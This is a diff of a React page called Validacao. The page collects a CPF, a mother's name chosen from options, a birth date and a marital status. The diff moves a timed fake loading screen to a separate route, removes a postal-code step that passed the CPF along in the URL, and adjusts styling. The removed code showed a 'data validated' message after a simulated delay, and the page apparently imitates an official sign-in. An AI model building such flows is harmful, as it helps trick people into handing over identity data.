@@ -27,10 +27,7 @@ export default function Validacao() {
   const [dataNascimento, setDataNascimento] = useState("");
   const [estadoCivil, setEstadoCivil] = useState("");
   
-  const [step, setStep] = useState(1); // 1: perguntas, 2: loading, 3: CEP
   const [validationError, setValidationError] = useState("");
-  const [cep, setCep] = useState("");
-  const [loadingCep, setLoadingCep] = useState(false);
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
@@ -140,44 +137,11 @@ export default function Validacao() {
       return;
     }
     
-    // Todos os campos preenchidos = mostra loading
-    setStep(2); // Loading
-    
-    // Após 3 segundos, vai para CEP
-    setTimeout(() => {
-      setStep(3); // CEP
-    }, 3000);
+    // Todos os campos preenchidos = redireciona para loading
+    setLocation("/loading-validacao");
   };
 
-  const formatCEP = (value: string) => {
-    const cleaned = value.replace(/\D/g, "");
-    if (cleaned.length <= 8) {
-      return cleaned.replace(/(\d{5})(\d)/, "$1-$2");
-    }
-    return value;
-  };
 
-  const handleCEPChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatted = formatCEP(e.target.value);
-    setCep(formatted);
-  };
-
-  const handleCEPSubmit = async () => {
-    const cleanedCEP = cep.replace(/\D/g, "");
-    
-    if (cleanedCEP.length !== 8) {
-      setValidationError("CEP inválido. Digite novamente.");
-      setTimeout(() => setValidationError(""), 3000);
-      return;
-    }
-    
-    setLoadingCep(true);
-    
-    // Simula loading de 3 segundos
-    setTimeout(() => {
-      setLocation(`/vagas?cep=${cleanedCEP}&cpf=${cpf}`);
-    }, 3000);
-  };
 
   if (loading) {
     return (
@@ -257,7 +221,7 @@ export default function Validacao() {
         </aside>
 
         <main id="main-signin">
-          {step === 1 && (
+          {
             <div className="card" id="login-cpf">
               <h3>Validação de Dados</h3>
               <p>
@@ -292,7 +256,8 @@ export default function Validacao() {
                           alignItems: "center",
                           cursor: "pointer",
                           margin: 0,
-                          width: "100%"
+                          width: "100%",
+                          gap: "12px"
                         }}
                       >
                         <input
@@ -301,9 +266,18 @@ export default function Validacao() {
                           value={nome}
                           checked={nomeMaeSelecionado === nome}
                           onChange={(e) => setNomeMaeSelecionado(e.target.value)}
-                          style={{ marginRight: "10px", flexShrink: 0 }}
+                          style={{ 
+                            flexShrink: 0,
+                            width: "18px",
+                            height: "18px",
+                            cursor: "pointer"
+                          }}
                         />
-                        <span style={{ fontWeight: nomeMaeSelecionado === nome ? "bold" : "normal", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "normal" }}>
+                        <span style={{ 
+                          fontWeight: nomeMaeSelecionado === nome ? "bold" : "normal",
+                          flex: 1,
+                          fontSize: "15px"
+                        }}>
                           {nome}
                         </span>
                       </label>
@@ -353,142 +327,7 @@ export default function Validacao() {
                 </div>
               </div>
             </div>
-          )}
-
-          {step === 2 && (
-            <div className="card" id="login-cpf">
-              <h3>✓ Dados Validados com Sucesso!</h3>
-              <p>
-                Seus dados foram confirmados. Agora precisamos do seu CEP para
-                verificar a disponibilidade de vagas na sua região.
-              </p>
-
-              <div className="accordion-panel" style={{ marginTop: "20px" }}>
-                <label htmlFor="cep">CEP</label>
-                <input
-                  id="cep"
-                  type="tel"
-                  maxLength={9}
-                  value={cep}
-                  onChange={handleCEPChange}
-                  placeholder="00000-000"
-                  disabled={loadingCep}
-                />
-
-                {validationError && (
-                  <p style={{ color: "#ff0000", marginTop: "10px" }}>
-                    {validationError}
-                  </p>
-                )}
-
-                {loadingCep && (
-                  <p style={{ color: "#008C32", marginTop: "10px" }}>
-                    Analisando disponibilidade de vagas na sua região...
-                  </p>
-                )}
-
-                <div className="button-panel">
-                  <button
-                    className="button-continuar"
-                    onClick={handleCEPSubmit}
-                    disabled={loadingCep}
-                  >
-                    {loadingCep ? "Analisando..." : "Verificar Vagas"}
-                  </button>
-                </div>
-              </div>
-            </div>
-          )}
-
-          {step === 2 && (
-            <div className="card" id="login-cpf">
-              <div style={{ textAlign: "center", padding: "40px 20px" }}>
-                <h3>Verificando seus dados...</h3>
-                <p style={{ marginBottom: "30px", color: "#666" }}>
-                  Aguarde enquanto analisamos as informações fornecidas.
-                </p>
-
-                {/* Animação de loading */}
-                <div
-                  style={{
-                    display: "flex",
-                    justifyContent: "center",
-                    alignItems: "center",
-                    marginBottom: "20px",
-                  }}
-                >
-                  <div
-                    style={{
-                      width: "60px",
-                      height: "60px",
-                      border: "6px solid #f3f3f3",
-                      borderTop: "6px solid #008C32",
-                      borderRadius: "50%",
-                      animation: "spin 1s linear infinite",
-                    }}
-                  ></div>
-                </div>
-
-                <p style={{ fontSize: "14px", color: "#666" }}>
-                  Verificando correspondência de dados...
-                </p>
-
-                <style>
-                  {`
-                    @keyframes spin {
-                      0% { transform: rotate(0deg); }
-                      100% { transform: rotate(360deg); }
-                    }
-                  `}
-                </style>
-              </div>
-            </div>
-          )}
-
-          {step === 3 && (
-            <div className="card" id="login-cpf">
-              <h3 style={{ color: "#008C32" }}>✓ Dados Validados</h3>
-              <p>
-                Agora precisamos do seu CEP para verificar a disponibilidade de
-                vagas na sua região.
-              </p>
-
-              <div className="accordion-panel">
-                <label htmlFor="cep">CEP</label>
-                <input
-                  type="text"
-                  id="cep"
-                  placeholder="00000-000"
-                  value={cep}
-                  onChange={(e) => setCep(formatCEP(e.target.value))}
-                  maxLength={9}
-                  disabled={loadingCep}
-                />
-
-                {validationError && (
-                  <p style={{ color: "#ff0000", marginTop: "10px" }}>
-                    {validationError}
-                  </p>
-                )}
-
-                {loadingCep && (
-                  <p style={{ color: "#008C32", marginTop: "10px" }}>
-                    Analisando disponibilidade de vagas na sua região...
-                  </p>
-                )}
-
-                <div className="button-panel">
-                  <button
-                    className="button-continuar"
-                    onClick={handleCEPSubmit}
-                    disabled={loadingCep}
-                  >
-                    {loadingCep ? "Analisando..." : "Verificar Vagas"}
-                  </button>
-                </div>
-              </div>
-            </div>
-          )}
+          }
         </main>
       </div>
 
